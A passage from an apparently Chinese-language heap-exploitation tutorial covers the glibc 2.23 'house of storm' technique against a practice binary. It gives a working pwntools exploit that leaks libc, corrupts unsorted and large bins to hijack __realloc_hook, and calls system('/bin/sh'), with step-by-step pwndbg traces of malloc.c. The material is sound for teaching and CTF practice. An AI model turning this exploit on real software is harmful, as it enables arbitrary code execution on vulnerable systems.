通过chunks[7]修改__realloc_hook里3个字节内容，使其变为system地址。以`b"\xeb\xc3\x{x}3"`为例, {x} 需要暴力破解0x10次左右。


### 1-20 house of storm

本方法为unsorted bin attack和large bin attack的组合技，二者核心原理参考[glibc2.23其一](https://binracer.github.io/2025/11/07/pwn4heap-glibc2.23%E5%85%B6%E4%B8%80/)与[glibc2.23其二](https://binracer.github.io/2025/11/15/pwn4heap-glibc2.23%E5%85%B6%E4%BA%8C/)，此处不在赘述。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/11/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_storm/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# house of storm
malloc(0, 0x4E8, b"A" * 0x8)  # unsorted_bin
malloc(1, 0x18, b"B" * 0x8)
malloc(2, 0x4D8, b"C" * 0x8)  # large_bin
malloc(3, 0x18, b"D" * 0x8)
delete(2)
delete(0)
malloc(0, 0x4E8, b"A" * 0x8)  # unsorted_bin
author_name, introduction, content = show(0)
main_arena88 = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
main_arena1144 = main_arena88 + 0x420
log.info(f"main_arena+1144: {hex(main_arena1144)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

edit(2, 0x10, b"C" * 0x10)
author_name, introduction, content = show(2)
chunk2_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00"))
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
edit(2, 0x10, p64(main_arena1144) * 2)

delete(0)
fake_chunk = libc.sym["__realloc_hook"] - 0x10
payload = p64(main_arena88) + p64(fake_chunk)
edit(0, len(payload), payload)
payload = p64(main_arena1144) + p64(fake_chunk + 0x8)
payload += p64(chunk2_addr) + p64(fake_chunk - 0x18 - 0x5)
edit(2, len(payload), payload)
evil_size = ((chunk2_addr >> 0x28) & 0xFFFFFFFFE) - 0x10
log.info(f"evil size: {hex(evil_size)}")
malloc(4, evil_size, b"\x00")
edit(4, 0x8, p64(libc.sym["system"]))
edit(0, 0x8, b"/bin/sh\x00")
conn.sendlineafter(b"> ", b"3")
conn.sendlineafter(b"Please input the chunk index: ", b"0")
conn.sendlineafter(b"Please input the size: ", b"16")
cmd = b"cat src/2.23/house_of_storm/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先申请chunks[0]、chunks[1]、chunks[2]、chunks[3]之后，heap内存结构布局如下：

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d3000
Size: 0x4f0 (with flag bits: 0x4f1)

Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d34f0
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d3510
Size: 0x4e0 (with flag bits: 0x4e1)

Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d39f0
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x5667cb5d3a10
Size: 0x205f0 (with flag bits: 0x205f1)

pwndbg> 
```

然后，释放chunks[2]和chunks[0]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5667cb5d3000 —▸ 0x5667cb5d3510 —▸ 0x7e7a2838db78 (main_arena+88) ◂— 0x5667cb5d3000
pwndbg> 
```

接着，申请chunks[0]将0x5667cb5d3000从unsorted bin里提取出来，而0x5667cb5d3510则进入large bin里。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d3000
Size: 0x4f0 (with flag bits: 0x4f1)

Allocated chunk | PREV_INUSE
Addr: 0x5667cb5d34f0
Size: 0x20 (with flag bits: 0x21)

Free chunk (largebins) | PREV_INUSE
Addr: 0x5667cb5d3510
Size: 0x4e0 (with flag bits: 0x4e1)
fd: 0x7e7a2838df98
bk: 0x7e7a2838df98
fd_nextsize: 0x5667cb5d3510
bk_nextsize: 0x5667cb5d3510

Allocated chunk
Addr: 0x5667cb5d39f0
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x5667cb5d3a10
Size: 0x205f0 (with flag bits: 0x205f1)

pwndbg> largebins 
largebins
0x4c0-0x4f0: 0x5667cb5d3510 —▸ 0x7e7a2838df98 (main_arena+1144) ◂— 0x5667cb5d3510
pwndbg>
```

此时，可以从chunks[0]内获取libc地址，从chunks[2]内获取heap地址。

```bash
pwndbg> p/x chunks[0]
$1 = {
  size = 0x4e8,
  addr = 0x5667cb5d3010
}
pwndbg> x/4gx 0x5667cb5d3010-0x10
0x5667cb5d3000: 0x0000000000000000      0x00000000000004f1
0x5667cb5d3010: 0x4141414141414141      0x00007e7a2838db78
pwndbg> p/x chunks[2]            
$2 = {
  size = 0x4d8,
  addr = 0x5667cb5d3520
}
pwndbg> x/6gx 0x5667cb5d3520-0x10
0x5667cb5d3510: 0x0000000000000000      0x00000000000004e1
0x5667cb5d3520: 0x00007e7a2838df98      0x00007e7a2838df98
0x5667cb5d3530: 0x00005667cb5d3510      0x00005667cb5d3510
pwndbg>
```

接着释放chunks[0]进入unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5667cb5d3000 —▸ 0x7e7a2838db78 (main_arena+88) ◂— 0x5667cb5d3000
pwndbg> 
```

修改chunks[0]->bk为`libc.sym["__realloc_hook"] - 0x10`。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5667cb5d3000 —▸ 0x7e7a2838db78 (main_arena+88) ◂— 0x5667cb5d3000
BK: 0x5667cb5d3000 —▸ 0x7e7a2838e3a8 (main_arena+2184) —▸ 0x7e7a28070c7b (memalign_hook_ini) ◂— ret 0x31
pwndbg> x/4gx 0x7e7a2838e3a8
0x7e7a2838e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a28070c31      0x00007e7a28070c7b
pwndbg> 
```

修改chunks[2]->bk为`p64(fake_chunk + 0x8)`，chunks[2]->bk_nextsize为`p64(fake_chunk - 0x18 - 0x5)`。

```bash
pwndbg> largebins 
largebins
0x4c0-0x4f0 [corrupted]
FD: 0x5667cb5d3510 —▸ 0x7e7a2838df98 (main_arena+1144) ◂— 0x5667cb5d3510
BK: 0x5667cb5d3510 —▸ 0x7e7a2838e3b0 (__malloc_hook) —▸ 0x7e7a2807a003 (print_and_abort) ◂— pushfq
pwndbg> x/6gx 0x5667cb5d3510
0x5667cb5d3510: 0x0000000000000000      0x00000000000004e1
0x5667cb5d3520: 0x00007e7a2838df98      0x00007e7a2838e3b0
0x5667cb5d3530: 0x00005667cb5d3510      0x00007e7a2838e38b
pwndbg> 
```

使用公式`evil_size = ((chunk2_addr >> 0x28) & 0xFFFFFFFFE) - 0x10`计算用来申请的内存大小。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
   3473           if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
   3474               || __builtin_expect (victim->size > av->system_mem, 0))
   3475             malloc_printerr (check_action, "malloc(): memory corruption",
   3476                              chunk2mem (victim), av);
   3477           size = chunksize (victim);

pwndbg> p/x victim
$5 = 0x5667cb5d3000
pwndbg> p/x victim->bk
$6 = 0x7e7a2838e3a8
pwndbg> x/4gx 0x7e7a2838e3a8
0x7e7a2838e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a28070c31      0x00007e7a28070c7b
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5667cb5d3000 —▸ 0x7e7a2838db78 (main_arena+88) ◂— 0x5667cb5d3000
BK: 0x5667cb5d3000 —▸ 0x7e7a2838e3a8 (main_arena+2184) —▸ 0x7e7a28070c7b (memalign_hook_ini) ◂— ret 0x31
pwndbg> 
```

进入unsorted bin处理循环，准备触发unsorted bin attack。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3487
   3481              only chunk in unsorted bin.  This helps promote locality for
   3482              runs of consecutive small requests. This is the only
   3483              exception to best-fit, and applies only when there is
   3484              no exact fit for a small chunk.
   3485            */
   3486 
 ► 3487           if (in_smallbin_range (nb) &&
   3488               bck == unsorted_chunks (av) &&
   3489               victim == av->last_remainder &&
   3490               (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
   3491             {
```

跳过`if (in_smallbin_range (nb) && ...`分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3517
   3511               alloc_perturb (p, bytes);
   3512               return p;
   3513             }
   3514 
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
 ► 3517           bck->fd = unsorted_chunks (av);
 
pwndbg> p/x bck
$8 = 0x7e7a2838e3a8
pwndbg> x/4gx 0x7e7a2838e3a8
0x7e7a2838e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a28070c31      0x00007e7a28070c7b
pwndbg> 
```

__realloc_hook即将被修改为unsorted_chunks (av)。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
   3522             {
   
pwndbg> x/4gx 0x7e7a2838e3a8
0x7e7a2838e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a2838db78      0x00007e7a28070c7b
pwndbg> p/x size
$9 = 0x4f0
pwndbg> p/x nb
$10 = 0x50
pwndbg> 
```

由于不满足`if (size == nb)`条件，并且不满足`if (in_smallbin_range (size))`条件，最终进入`if (in_smallbin_range (size))`其else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3534
   3528               alloc_perturb (p, bytes);
   3529               return p;
   3530             }
   3531 
   3532           /* place chunk in bin */
   3533 
 ► 3534           if (in_smallbin_range (size))
   3535             {
   3536               victim_index = smallbin_index (size);
   3537               bck = bin_at (av, victim_index);
   3538               fwd = bck->fd;
   3539             }
   3540           else
   3541             {
   3542               victim_index = largebin_index (size);
   3543               bck = bin_at (av, victim_index);
   3544               fwd = bck->fd;
   3545 
   3546               /* maintain large bins in sorted order */
   3547               if (fwd != bck)
   3548                 {
   
pwndbg> p/x bck
$11 = 0x7e7a2838df98
pwndbg> p/x bck->fd
$12 = 0x5667cb5d3510
pwndbg> 
```

由于满足`if (fwd != bck)`条件，进入该分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3553
   3547               if (fwd != bck)
   3548                 {
   3549                   /* Or with inuse bit to speed comparisons */
   3550                   size |= PREV_INUSE;
   3551                   /* if smaller than smallest, bypass loop below */
   3552                   assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
 ► 3553                   if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
   3554                     {
   
pwndbg> p/x size
$13 = 0x4f1
pwndbg> p/x bck->bk->size
$14 = 0x4e1
pwndbg> 
```

不满足`if ((unsigned long) (size) < (unsigned long) (bck->bk->size))`条件，进入其else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3565
   3559                       victim->bk_nextsize = fwd->fd->bk_nextsize;
   3560                       fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
   3561                     }
   3562                   else
   3563                     {
   3564                       assert ((fwd->size & NON_MAIN_ARENA) == 0);
 ► 3565                       while ((unsigned long) size < fwd->size)
   3566                         {
   3567                           fwd = fwd->fd_nextsize;
   3568                           assert ((fwd->size & NON_MAIN_ARENA) == 0);
   3569                         }
   3570 
   3571                       if ((unsigned long) size == (unsigned long) fwd->size)
   
pwndbg> p/x size
$15 = 0x4f1
pwndbg> p/x fwd->size
$16 = 0x4e1
pwndbg> 
```

跳过fwd->fd_nextsize链表遍历，并进入`if ((unsigned long) size == (unsigned long) fwd->size)`其else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3579
   3573                         fwd = fwd->fd;
   3574                       else
   3575                         {
   3576                           victim->fd_nextsize = fwd;
   3577                           victim->bk_nextsize = fwd->bk_nextsize;
   3578                           fwd->bk_nextsize = victim;
 ► 3579                           victim->bk_nextsize->fd_nextsize = victim;
   3580                         }
   3581                       bck = fwd->bk;
 
pwndbg> p/x victim
$20 = 0x5667cb5d3000
pwndbg> p/x victim->bk_nextsize
$21 = 0x7e7a2838e38b
pwndbg> p/x victim->bk_nextsize->fd_nextsize
$22 = 0x0
pwndbg> x/6gx 0x7e7a2838e38b 
0x7e7a2838e38b <main_arena+2155>:       0x00000000007e7a28      0x0000010000000000
0x7e7a2838e39b <main_arena+2171>:       0x0210000000000000      0x0210000000000000
0x7e7a2838e3ab <main_arena+2187>:       0x0000000000000000      0x38db780000000000
pwndbg> p/x fwd
$23 = 0x5667cb5d3510
pwndbg> p/x fwd->bk
$24 = 0x7e7a2838e3b0
pwndbg> 
```

修改victim->bk_nextsize->fd_nextsize为0x5667cb5d3000之后，紧接着将bck修改为0x7e7a2838e3b0。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3591
   3585                 victim->fd_nextsize = victim->bk_nextsize = victim;
   3586             }
   3587 
   3588           mark_bin (av, victim_index);
   3589           victim->bk = bck;
   3590           victim->fd = fwd;
 ► 3591           fwd->bk = victim;
   3592           bck->fd = victim;
   3593 
   3594 #define MAX_ITERS       10000
   3595           if (++iters >= MAX_ITERS)
   
pwndbg> p/x fwd
$26 = 0x5667cb5d3510
pwndbg> p/x fwd->bk
$27 = 0x7e7a2838e3b0
pwndbg> p/x bck
$28 = 0x7e7a2838e3b0
pwndbg> p/x bck->fd
$29 = 0x7e7a28070c7b
pwndbg> x/4gx 0x7e7a2838e3b0
0x7e7a2838e3b0 <__malloc_hook>: 0x0000000000000056      0x00007e7a2838db78
0x7e7a2838e3c0 <__memalign_hook>:       0x00007e7a28070c7b      0x00007e7a2807a003
pwndbg> 

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3595
   3589           victim->bk = bck;
   3590           victim->fd = fwd;
   3591           fwd->bk = victim;
   3592           bck->fd = victim;
   3593 
   3594 #define MAX_ITERS       10000
 ► 3595           if (++iters >= MAX_ITERS)
 
pwndbg> x/4gx 0x7e7a2838e3b0
0x7e7a2838e3b0 <__malloc_hook>: 0x0000000000000056      0x00007e7a2838db78
0x7e7a2838e3c0 <__memalign_hook>:       0x00005667cb5d3000      0x00007e7a2807a003
pwndbg> 
```

开始进入第二轮循环。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
 
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5667cb5d3000 —▸ 0x5667cb5d3510 —▸ 0x7e7a2838df98 (main_arena+1144) ◂— 0x5667cb5d3510
BK: 0x7e7a2838e3a8 (main_arena+2184) —▸ 0x5667cb5d3000 —▸ 0x7e7a2838e3b0 (__malloc_hook) —▸ 0x7e7a2807a003 (print_and_abort) ◂— pushfq
pwndbg> p/x victim
$30 = 0x7e7a2838e3a8
pwndbg> x/4gx 0x7e7a2838e3a8
0x7e7a2838e3a8 <main_arena+2184>:       0x67cb5d3000021000      0x0000000000000056 <= fake chunk
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a2838db78      0x00005667cb5d3000
pwndbg> 
```

可以发现victim刚好存在一个fake chunk。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
   3522             {
   3523               set_inuse_bit_at_offset (victim, size);
   3524               if (av != &main_arena)
   3525                 victim->size |= NON_MAIN_ARENA;
   3526               check_malloced_chunk (av, victim, nb);
   3527               void *p = chunk2mem (victim);
   3528               alloc_perturb (p, bytes);
   
pwndbg> p/x size
$34 = 0x50
pwndbg> p/x nb
$35 = 0x50
pwndbg> 
```

由于满足`if (size == nb)`条件，将fake chunk返回用户。

```bash
pwndbg> bins
fastbins
empty
unsortedbin
all [corrupted]
FD: 0x5667cb5d3000 —▸ 0x7e7a2838db78 (main_arena+88) ◂— 0x5667cb5d3000
BK: 0x5667cb5d3000 —▸ 0x7e7a2838e3b0 (__malloc_hook) —▸ 0x7e7a2807a003 (print_and_abort) ◂— pushfq
smallbins
empty
largebins
0x4c0-0x4f0 [corrupted]
FD: 0x5667cb5d3510 —▸ 0x7e7a2838df98 (main_arena+1144) ◂— 0x5667cb5d3510
BK: 0x5667cb5d3510 —▸ 0x5667cb5d3000 —▸ 0x7e7a2838e3b0 (__malloc_hook) —▸ 0x7e7a2807a003 (print_and_abort) ◂— pushfq
pwndbg> x/10gx chunks
0x56678b7b40c0 <chunks>:        0x0000000000000010      0x00005667cb5d3010
0x56678b7b40d0 <chunks+16>:     0x0000000000000018      0x00005667cb5d3500
0x56678b7b40e0 <chunks+32>:     0x0000000000000020      0x00005667cb5d3520
0x56678b7b40f0 <chunks+48>:     0x0000000000000018      0x00005667cb5d3a00
0x56678b7b4100 <chunks+64>:     0x0000000000000046      0x00007e7a2838e3b8
pwndbg> x/4gx 0x00007e7a2838e3b8
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a2838db00      0x00005667cb5d3000
0x7e7a2838e3c8 <obstack_alloc_failed_handler>:  0x00007e7a2807a003      0x00007e7a281581b2
pwndbg> x/4gx 0x00007e7a2838e3b8-0x10
0x7e7a2838e3a8 <main_arena+2184>:       0x67cb5d3000021000      0x0000000000000056
0x7e7a2838e3b8 <__realloc_hook>:        0x00007e7a2838db00      0x00005667cb5d3000
pwndbg> 
```

可以发现chunks[4]已经获取__realloc_hook的控制权了，接下来获取shell轻而易举。


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
